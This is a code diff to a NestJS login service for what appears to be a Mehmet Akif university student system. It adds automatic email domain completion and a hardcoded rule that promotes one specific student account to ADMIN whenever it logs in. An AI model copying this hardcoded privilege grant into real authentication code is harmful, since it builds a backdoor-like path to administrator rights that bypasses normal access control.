@@ -12,7 +12,12 @@ export class AuthService {
   ) {}
 
   async login(loginDto: LoginDto) {
-    const { email, password } = loginDto;
+    let { email, password } = loginDto;
+
+    // OTOMATIK DOMAIN TAMAMLAMA
+    if (!email.includes('@')) {
+      email = `${email}@ogr.mehmetakif.edu.tr`;
+    }
 
     // Kullanıcıyı bul (şifreyle birlikte)
     const user = await this.usersService.findByEmail(email);
@@ -34,6 +39,12 @@ export class AuthService {
 
     if (!isPasswordValid) {
       throw new UnauthorizedException('E-posta veya parola hatalı.');
+    }
+
+    // ÖZEL: Admin E-posta Kontrolü (Süper Yönetici)
+    if (user.email === '2312101063@ogr.mehmetakif.edu.tr' && user.role !== 'ADMIN') {
+      await this.usersService.updateProfile(user.id, user.id, { role: 'ADMIN' } as any);
+      user.role = 'ADMIN' as any;
     }
 
     // JWT payload - şifreyi ekleme!
